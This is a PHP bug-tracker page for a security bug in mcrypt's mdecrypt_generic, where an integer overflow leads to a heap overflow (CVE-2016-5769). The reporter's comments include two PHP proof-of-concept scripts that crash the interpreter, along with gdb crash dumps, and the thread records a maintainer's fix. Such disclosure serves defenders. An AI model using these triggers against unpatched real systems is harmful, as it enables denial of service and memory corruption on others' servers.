<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    
        <link rel='alternate' type='application/rss+xml' title='mcrypt related Bug #72455 - RDF' href='rss/bug.php?id=72455'>
        <link rel='alternate' type='application/rss+xml' title='mcrypt related Bug #72455 - RSS 2.0' href='rss/bug.php?id=72455&format=rss2'>
        <base href="https://bugs.php.net/">
    <title>PHP :: Sec Bug #72455 :: Heap Overflow due to integer overflows</title>
    <link rel="shortcut icon" href="https://bugs.php.net/images/favicon.ico">
    <link rel="stylesheet" href="https://bugs.php.net/css/style.css">
</head>

<body>

<table id="top" class="head" cellspacing="0" cellpadding="0">
    <tr>
        <td class="head-logo">
            <a href="/"><img src="images/logo.png" alt="Bugs" vspace="2" hspace="2"></a>
        </td>

        <td class="head-menu">
            <a href="https://php.net/">php.net</a>&nbsp;|&nbsp;
            <a href="https://php.net/support.php">support</a>&nbsp;|&nbsp;
            <a href="https://php.net/docs.php">documentation</a>&nbsp;|&nbsp;
            <a href="report.php">report a bug</a>&nbsp;|&nbsp;
            <a href="search.php">advanced search</a>&nbsp;|&nbsp;
            <a href="search-howto.php">search howto</a>&nbsp;|&nbsp;
            <a href="stats.php">statistics</a>&nbsp;|&nbsp;
            <a href="random">random bug</a>&nbsp;|&nbsp;
            <a href="login.php">login</a>
        </td>
    </tr>

    <tr>
        <td class="head-search" colspan="2">
            <form method="get" action="search.php">
                <p class="head-search">
                    <input type="hidden" name="cmd" value="display">
                    <small>go to bug id or search bugs for</small>
                    <input class="small" type="text" name="search_for" value="" size="30">
                    <input type="image" src="images/small_submit_white.gif" alt="search" style="vertical-align: middle;">
                </p>
            </form>
        </td>
    </tr>
</table>

<table class="middle" cellspacing="0" cellpadding="0">
    <tr>
        <td class="content">
<div id="bugheader">
    <table id="details">
        <tr id="title">
            <th class="details" id="number"><a href="bug.php?id=72455">Sec Bug</a>&nbsp;#72455</th>
            <td id="summary" colspan="5">Heap Overflow due to integer overflows</td>
        </tr>
        <tr id="submission">
            <th class="details">Submitted:</th>
            <td style="white-space: nowrap;">2016-06-20 08:33 UTC</td>
            <th class="details">Modified:</th>
            <td style="white-space: nowrap;">2016-06-27 06:39 UTC</td>
            <td rowspan="6">


            </td>
        </tr>

        <tr id="submitter">
            <th class="details">From:</th>
            <td>nguyenvuhoang199321 &#x61;&#116; gmail &#x64;&#111;&#x74; com</td>
            <th class="details">Assigned:</th>
            <td><a href="search.php?cmd=display&amp;assign=stas">stas</a> (<a href="https://people.php.net/stas">profile</a>)</td>
        </tr>

        <tr id="categorization">
            <th class="details">Status:</th>
            <td>Closed</td>
            <th class="details">Package:</th>
            <td><a href="search.php?cmd=display&amp;package_name[]=mcrypt+related">mcrypt related</a></td>
        </tr>

        <tr id="situation">
            <th class="details">PHP Version:</th>
            <td>5.5.36</td>
            <th class="details">OS:</th>
            <td>*Nix</td>
        </tr>

        <tr id="private">
            <th class="details">Private report:</th>
            <td>No</td>
            <th class="details">CVE-ID:</th>
            <td><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5769" target="_blank">2016-5769</a></td>
        </tr>
    </table>
</div>

<div class="controls">
<span id='control_0' class='control active'>View</span>
<span id='control_3' class='control'><a href='bug.php?id=72455&amp;edit=3'>Add Comment</a></span>
<span id='control_1' class='control'><a href='bug.php?id=72455&amp;edit=1'>Developer</a></span>
<span id='control_2' class='control'><a href='bug.php?id=72455&amp;edit=2'>Edit</a></span>
</div>
<div class="clear"></div>



<div class='comment type_comment' ><a name="1466411580">&nbsp;</a><strong>[2016-06-20 08:33 UTC] nguyenvuhoang199321 &#x61;&#116; gmail &#x64;&#111;&#x74; com</strong>
<pre class='note'>Description:
------------
When i looked at PHP_FUNCTION(mcrypt_generic) i had found an integer overflow when mcrypt_generic try to calculate data_size, and then use this value pass to emalloc this result will lead to heap overflow.
```
PHP_FUNCTION(mdecrypt_generic)
{
     **** snip***
     int block_size, data_size; // signed int
     /* Check blocksize */
     if (mcrypt_enc_is_block_mode(pm-&gt;td) == 1) { /* It's a block algorithm */
		block_size = mcrypt_enc_get_block_size(pm-&gt;td);
		data_size = ((((int)data_len - 1) / block_size) + 1) * block_size;
		data_s = emalloc(data_size + 1);
		memset(data_s, 0, data_size);
		memcpy(data_s, data, data_len);

     }
```
As you can see data_size follow by formular : data_size = ((((int)data_len - 1) / block_size) + 1) * block_size; because data_size is int. If attacker control data_len for example data_len = 0xffffffff then data_size = 0x20, after that, they will emalloc(0x20) bytes and then use memcpy data to data_s with data_len is 0xffffffff in unsigned int is 4294967295. This may lead to heap overflow

Test script:
---------------
&lt;?php
	/* Data */
	ini_set('memory_limit',-1);

	$key = str_repeat('C', 32);
	$str = str_repeat('A', 0xfffffff0);

	// $td = mcrypt_module_open('des', '', 'ecb', '');
	$td = mcrypt_module_open(MCRYPT_RIJNDAEL_256, '', 'cbc', '');
	$ks = mcrypt_enc_get_key_size($td);

	$iv = str_repeat('D', 32);

	if (mcrypt_generic_init($td, $key, $iv) != -1) {
		mcrypt_generic_init($td, $key, $iv);
		$p_t = mdecrypt_generic($td, $str);

		mcrypt_generic_deinit($td);
		mcrypt_module_close($td);
	}
?&gt;

Expected result:
----------------
$ ./php7.0.7 test.php
[1]    12342 segmentation fault (core dumped)  ./php7.0.7 test.php

Actual result:
--------------
gdb-peda$ r test.php
Starting program: /media/Data/Build/audit/php7.0.7 test.php

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0x7ffff427c320 --&gt; 0x0
RBX: 0x0
RCX: 0x8000f427c310
RDX: 0xffe7c2d0
RSI: 0x7ffef3d83d38 ('A' &lt;repeats 200 times&gt;...)
RDI: 0x7ffff43fffc0 ('A' &lt;repeats 64 times&gt;&lt;error: Cannot access memory at address 0x7ffff4400000&gt;)
RBP: 0x7fffffffaf50 --&gt; 0x7fffffffaf80 --&gt; 0x7fffffffafb0 --&gt; 0x7fffffffaff0 --&gt; 0x7fffffffb100 --&gt; 0x7fffffffd400 --&gt; 0x7fffffffe780 --&gt; 0x7fffffffe8d0 --&gt; 0x9a0b00 (&lt;__libc_csu_init&gt;:	push   r15)
RSP: 0x7fffffffaee8 --&gt; 0x64e590 (&lt;zif_mdecrypt_generic+401&gt;:	jmp    0x64e5f2 &lt;zif_mdecrypt_generic+499&gt;)
RIP: 0x7ffff6c2ba0e (&lt;__memcpy_avx_unaligned+830&gt;:	vmovntdq YMMWORD PTR [rdi+0x40],ymm2)
R8 : 0x7ffff427c320 --&gt; 0x0
R9 : 0x0
R10: 0x20 (' ')
R11: 0x7ffff77746e0 (&lt;mcrypt_enc_get_block_size&gt;:	mov    rax,QWORD PTR [rdi+0xc8])
R12: 0x424690 (&lt;_start&gt;:	xor    ebp,ebp)
R13: 0x7fffffffe9b0 --&gt; 0x2
R14: 0x7ffff4214030 --&gt; 0x7ffff427f5c0 ('A' &lt;repeats 200 times&gt;...)
R15: 0x7ffff427f5c0 ('A' &lt;repeats 200 times&gt;...)
EFLAGS: 0x10203 (CARRY parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x7ffff6c2ba01 &lt;__memcpy_avx_unaligned+817&gt;:	sub    rsi,0xffffffffffffff80
   0x7ffff6c2ba05 &lt;__memcpy_avx_unaligned+821&gt;:	vmovntdq YMMWORD PTR [rdi],ymm0
   0x7ffff6c2ba09 &lt;__memcpy_avx_unaligned+825&gt;:	vmovntdq YMMWORD PTR [rdi+0x20],ymm1
=&gt; 0x7ffff6c2ba0e &lt;__memcpy_avx_unaligned+830&gt;:	vmovntdq YMMWORD PTR [rdi+0x40],ymm2
   0x7ffff6c2ba13 &lt;__memcpy_avx_unaligned+835&gt;:	vmovntdq YMMWORD PTR [rdi+0x60],ymm3
   0x7ffff6c2ba18 &lt;__memcpy_avx_unaligned+840&gt;:	sub    rdi,0xffffffffffffff80
   0x7ffff6c2ba1c &lt;__memcpy_avx_unaligned+844&gt;:	add    rdx,0xffffffffffffff80
   0x7ffff6c2ba20 &lt;__memcpy_avx_unaligned+848&gt;:	jb     0x7ffff6c2b9e0 &lt;__memcpy_avx_unaligned+784&gt;
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffaee8 --&gt; 0x64e590 (&lt;zif_mdecrypt_generic+401&gt;:	jmp    0x64e5f2 &lt;zif_mdecrypt_generic+499&gt;)
0008| 0x7fffffffaef0 --&gt; 0x7ffff42141e0 --&gt; 0x0
0016| 0x7fffffffaef8 --&gt; 0x7ffff4214220 --&gt; 0x0
0024| 0x7fffffffaf00 --&gt; 0xfffffda9000000e2
0032| 0x7fffffffaf08 --&gt; 0x2000000020 (' ')
0040| 0x7fffffffaf10 --&gt; 0x7ffff4214280 --&gt; 0x7ffff42010e0 --&gt; 0x900000002
0048| 0x7fffffffaf18 --&gt; 0x7ffef3c00018 ('A' &lt;repeats 200 times&gt;...)
0056| 0x7fffffffaf20 --&gt; 0xfffffff0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
__memcpy_avx_unaligned () at ../sysdeps/x86_64/multiarch/memcpy-avx-unaligned.S:272
272	../sysdeps/x86_64/multiarch/memcpy-avx-unaligned.S: No such file or directory.
gdb-peda$ bt
#0  __memcpy_avx_unaligned () at ../sysdeps/x86_64/multiarch/memcpy-avx-unaligned.S:272
#1  0x000000000064e590 in zif_mdecrypt_generic (execute_data=0x7ffff4214220, return_value=0x7ffff42141e0) at /home/hoangnguyen/Data/Build/audit/php-7.0.7/ext/mcrypt/mcrypt.c:688
#2  0x000000000092cb3e in ZEND_DO_ICALL_SPEC_HANDLER () at /home/hoangnguyen/Data/Build/audit/php-7.0.7/Zend/zend_vm_execute.h:586
#3  0x000000000092c56a in execute_ex (ex=0x7ffff4214030) at /home/hoangnguyen/Data/Build/audit/php-7.0.7/Zend/zend_vm_execute.h:414
#4  0x000000000092c67b in zend_execute (op_array=0x7ffff427e000, return_value=0x0) at /home/hoangnguyen/Data/Build/audit/php-7.0.7/Zend/zend_vm_execute.h:458
#5  0x00000000008cd94a in zend_execute_scripts (type=0x8, retval=0x0, file_count=0x3) at /home/hoangnguyen/Data/Build/audit/php-7.0.7/Zend/zend.c:1427
#6  0x00000000008362ea in php_execute_script (primary_file=0x7fffffffd630) at /home/hoangnguyen/Data/Build/audit/php-7.0.7/main/main.c:2494
#7  0x0000000000995591 in do_cli (argc=0x2, argv=0x115d440) at /home/hoangnguyen/Data/Build/audit/php-7.0.7/sapi/cli/php_cli.c:974
#8  0x000000000099675f in main (argc=0x2, argv=0x115d440) at /home/hoangnguyen/Data/Build/audit/php-7.0.7/sapi/cli/php_cli.c:1344
#9  0x00007ffff6afe830 in __libc_start_main (main=0x995f54 &lt;main&gt;, argc=0x2, argv=0x7fffffffe9b8, init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;,
    stack_end=0x7fffffffe9a8) at ../csu/libc-start.c:291
#10 0x00000000004246b9 in _start ()

</pre>
</div><h2>Patches</h2>
<p><a href='patch-add.php?bug_id=72455'>Add a Patch</a></p><h2>Pull Requests</h2>
<p><a href='gh-pull-add.php?bug_id=72455'>Add a Pull Request</a></p><h2 style="border-bottom:2px solid #666;margin-bottom:0;padding:5px 0;">History</h2><div id='comment_filter' class='controls comments'><span id='type_all' class='control active' onclick='do_comment(this);'>All</span><span id='type_comment' class='control ' onclick='do_comment(this);'>Comments</span><span id='type_log' class='control ' onclick='do_comment(this);'>Changes</span><span id='type_svn' class='control ' onclick='do_comment(this);'>Git/SVN commits</span><span id='type_related' class='control ' onclick='do_comment(this);'>Related reports</span>            </div>
            <div id='comments_view' style='clear:both;'>
<div class='comment type_log' ><a name="1466412881">&nbsp;</a><strong>[2016-06-20 08:54 UTC] nguyenvuhoang199321 &#x61;&#116; gmail &#x64;&#111;&#x74; com</strong>
<div class='log_note'><div class="changeset">
<span class="removed">-Summary: Integer overflow lead to heap overflow</span>
<span class="added">+Summary: Heap Overflow due to integer overflows</span>
</div></div></div><div class='comment type_comment' ><a name="1466412881">&nbsp;</a><strong>[2016-06-20 08:54 UTC] nguyenvuhoang199321 &#x61;&#116; gmail &#x64;&#111;&#x74; com</strong>
<pre class='note'>Another code block that lead to integer overflow when check encrypt data is not a block cipher. They just cast data_len from unsigned int to signed int, if attacker control data_len = 0xffffffff (in signed int is -1) so data_size +1 is 0 and pass to emalloc, after that they use data_len (is unsigned integer is 4294967295) to copy data to data_s, this leads to heap overflow
```
	} else { /* It's not a block algorithm */
		data_size = (int)data_len;
		data_s = emalloc(data_size + 1);
		memset(data_s, 0, data_size);
		memcpy(data_s, data, data_len);
	}
```

other poc :
```
&lt;?php
	/* Data */
	ini_set('memory_limit',-1);

	$key = str_repeat('C', 32);
	$str = str_repeat('A', 0xffffffff);

	// $td = mcrypt_module_open('des', '', 'ecb', '');
	// $td = mcrypt_module_open(MCRYPT_RIJNDAEL_256, '', 'cbc', ''); // block cipher
	$td = mcrypt_module_open('rijndael-256', '', 'ofb', ''); // not block cipher

	$ks = mcrypt_enc_get_key_size($td);

	$iv = str_repeat('D', 32);

	if (mcrypt_generic_init($td, $key, $iv) != -1) {
		mcrypt_generic_init($td, $key, $iv);
		$p_t = mdecrypt_generic($td, $str);

		mcrypt_generic_deinit($td);
		mcrypt_module_close($td);
	}
?&gt;
```

Crash when try to copy large size to a small memory size.
```
Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0x0
RBX: 0x0
RCX: 0xffffffffffe6f027
RDX: 0xffffffffffffffff
RSI: 0x7ffff426f027 --&gt; 0x0
RDI: 0x7ffff4400000
RBP: 0x7fffffffaf50 --&gt; 0x7fffffffaf80 --&gt; 0x7fffffffafb0 --&gt; 0x7fffffffaff0 --&gt; 0x7fffffffb100 --&gt; 0x7fffffffd400 --&gt; 0x7fffffffe780 --&gt; 0x7fffffffe8d0 --&gt; 0x9a0b00 (&lt;__libc_csu_init&gt;:	push   r15)
RSP: 0x7fffffffaee8 --&gt; 0x64e5db (&lt;zif_mdecrypt_generic+476&gt;:	mov    rdx,QWORD PTR [rbp-0x30])
RIP: 0x7ffff6c50328 (&lt;__memset_avx2+392&gt;:	rep stos BYTE PTR es:[rdi],al)
R8 : 0x2b3
R9 : 0x0
R10: 0x4
R11: 0x7ffff7774c00 (&lt;mcrypt_enc_is_block_mode&gt;:	sub    rsp,0x10)
R12: 0x424690 (&lt;_start&gt;:	xor    ebp,ebp)
R13: 0x7fffffffe9b0 --&gt; 0x2
R14: 0x7ffff4214030 --&gt; 0x7ffff427f5a0 --&gt; 0x0
R15: 0x7ffff427f5a0 --&gt; 0x0
EFLAGS: 0x10287 (CARRY PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x7ffff6c5031d &lt;__memset_avx2+381&gt;:	nop    DWORD PTR [rax]
   0x7ffff6c50320 &lt;__memset_avx2+384&gt;:	sub    rcx,0xffffffffffffff80
   0x7ffff6c50324 &lt;__memset_avx2+388&gt;:	vmovd  eax,xmm0
=&gt; 0x7ffff6c50328 &lt;__memset_avx2+392&gt;:	rep stos BYTE PTR es:[rdi],al
   0x7ffff6c5032a &lt;__memset_avx2+394&gt;:	mov    rax,rsi
   0x7ffff6c5032d &lt;__memset_avx2+397&gt;:	sub    rax,rdx
   0x7ffff6c50330 &lt;__memset_avx2+400&gt;:	vzeroupper
   0x7ffff6c50333 &lt;__memset_avx2+403&gt;:	ret
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffaee8 --&gt; 0x64e5db (&lt;zif_mdecrypt_generic+476&gt;:	mov    rdx,QWORD PTR [rbp-0x30])
0008| 0x7fffffffaef0 --&gt; 0x7ffff42141d0 --&gt; 0x0
0016| 0x7fffffffaef8 --&gt; 0x7ffff4214210 --&gt; 0x0
0024| 0x7fffffffaf00 --&gt; 0xfffffda9000000e2
0032| 0x7fffffffaf08 --&gt; 0xf70ec160ffffffff
0040| 0x7fffffffaf10 --&gt; 0x7ffff4214270 --&gt; 0x7ffff42010e0 --&gt; 0x900000002
0048| 0x7fffffffaf18 --&gt; 0x7ffef3c00018 ('A' &lt;repeats 200 times&gt;...)
0056| 0x7fffffffaf20 --&gt; 0xffffffff
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
__memset_avx2 () at ../sysdeps/x86_64/multiarch/memset-avx2.S:161
161	../sysdeps/x86_64/multiarch/memset-avx2.S: No such file or directory.
gdb-peda$
```
</pre>
</div><div class='comment type_log' ><a name="1466484828">&nbsp;</a><strong>[2016-06-21 04:53 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-PHP Version: 7.0.7</span>
<span class="added">+PHP Version: 5.5.36</span>
<span class="removed">-Assigned To:</span>
<span class="added">+Assigned To: stas</span>
</div></div></div><div class='comment type_comment' ><a name="1466484828">&nbsp;</a><strong>[2016-06-21 04:53 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Fixed in security repo as 6c5211a0cef0cc2854eaa387e0eb036e012904d0 and in <a href="https://gist.github.com/18df0450985e5486b2af2903948f991b" rel="nofollow">https://gist.github.com/18df0450985e5486b2af2903948f991b</a>

Please verify.
</pre>
</div><div class='comment type_svn' ><a name="1466491730">&nbsp;</a><strong>[2016-06-21 06:48 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=6c5211a0cef0cc2854eaa387e0eb036e012904d0" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=6c5211a0cef0cc2854eaa387e0eb036e012904d0</a>
Log: Fix <a href='bug.php?id=72455'>bug #72455</a>:  Heap Overflow due to integer overflows
</pre>
</div><div class='comment type_log' ><a name="1466491730">&nbsp;</a><strong>[2016-06-21 06:48 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-Status: Assigned</span>
<span class="added">+Status: Closed</span>
</div></div></div><div class='comment type_comment' ><a name="1466491908">&nbsp;</a><strong>[2016-06-21 06:51 UTC] nguyenvuhoang199321 &#x61;&#116; gmail &#x64;&#111;&#x74; com</strong>
<pre class='note'>Hello can we assign a CVE for this ? :)
</pre>
</div><div class='comment type_svn' ><a name="1466492616">&nbsp;</a><strong>[2016-06-21 07:03 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=6c5211a0cef0cc2854eaa387e0eb036e012904d0" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=6c5211a0cef0cc2854eaa387e0eb036e012904d0</a>
Log: Fix <a href='bug.php?id=72455'>bug #72455</a>:  Heap Overflow due to integer overflows
</pre>
</div><div class='comment type_svn' ><a name="1466493966">&nbsp;</a><strong>[2016-06-21 07:26 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=6c5211a0cef0cc2854eaa387e0eb036e012904d0" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=6c5211a0cef0cc2854eaa387e0eb036e012904d0</a>
Log: Fix <a href='bug.php?id=72455'>bug #72455</a>:  Heap Overflow due to integer overflows
</pre>
</div><div class='comment type_svn' ><a name="1466494036">&nbsp;</a><strong>[2016-06-21 07:27 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=6c5211a0cef0cc2854eaa387e0eb036e012904d0" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=6c5211a0cef0cc2854eaa387e0eb036e012904d0</a>
Log: Fix <a href='bug.php?id=72455'>bug #72455</a>:  Heap Overflow due to integer overflows
</pre>
</div><div class='comment type_svn' ><a name="1466575080">&nbsp;</a><strong>[2016-06-22 05:58 UTC] <a href="//people.php.net/krakjoe">krakjoe@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=6c5211a0cef0cc2854eaa387e0eb036e012904d0" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=6c5211a0cef0cc2854eaa387e0eb036e012904d0</a>
Log: Fix <a href='bug.php?id=72455'>bug #72455</a>:  Heap Overflow due to integer overflows
</pre>
</div><div class='comment type_log' ><a name="1466686241">&nbsp;</a><strong>[2016-06-23 12:50 UTC] <a href="//people.php.net/kaplan">kaplan@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-CVE-ID:</span>
<span class="added">+CVE-ID: 2016-5769</span>
</div></div></div><div class='comment type_comment' ><a name="1467009599">&nbsp;</a><strong>[2016-06-27 06:39 UTC] nguyenvuhoang199321 &#x61;&#116; gmail &#x64;&#111;&#x74; com</strong>
<pre class='note'>Today, i have time to review your patch for this bug.
```
+		if (data_size &lt;= 0) {
+			php_error_docref(NULL TSRMLS_CC, E_WARNING, &quot;Integer overflow in data size&quot;);
+			RETURN_FALSE;
+		}
```
It's still crash with my poc.
Sorry with my bad (i don't review your patch) :(
</pre>
</div></div>
        </td>
    </tr>
</table>

<script src='js/util.js'></script>
<script src='https://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js'></script>
<script src="js/jquery.cookie.js"></script>
<script>
function do_comment(nd)
{
    $('#comment_filter > .control.active').removeClass("active");
    $(nd).addClass("active");

    $.cookie('history_tab', nd.id, { expires: 365 });

    if (nd.id == 'type_all') {
        $('#comments_view > .comment:hidden').show('slow');
    } else {
        $('#comments_view > .comment').each(function(i) {
            if ($(this).hasClass(nd.id)) {
                $(this).show('slow');
            } else {
                $(this).hide('slow');
            }
        });
    }
    return false;
}
</script>
<table class="foot" cellspacing="0" cellpadding="0">
    <tr>
        <td class="foot-bar" colspan="2">&nbsp;</td>
    </tr>

    <tr>
        <td class="foot-copy">
            <small>
                <a href="https://php.net/"><img src="images/logo-small.gif" align="left" valign="middle" hspace="3" alt="PHP"></a>
                <a href="https://php.net/copyright.php">Copyright &copy; 2001-2021 The PHP Group</a><br>
                All rights reserved.
            </small>
        </td>
        <td class="foot-source">
            <small>Last updated: Sat Oct 30 19:03:34 2021 UTC</small>
        </td>
    </tr>
</table>
</body>
</html>
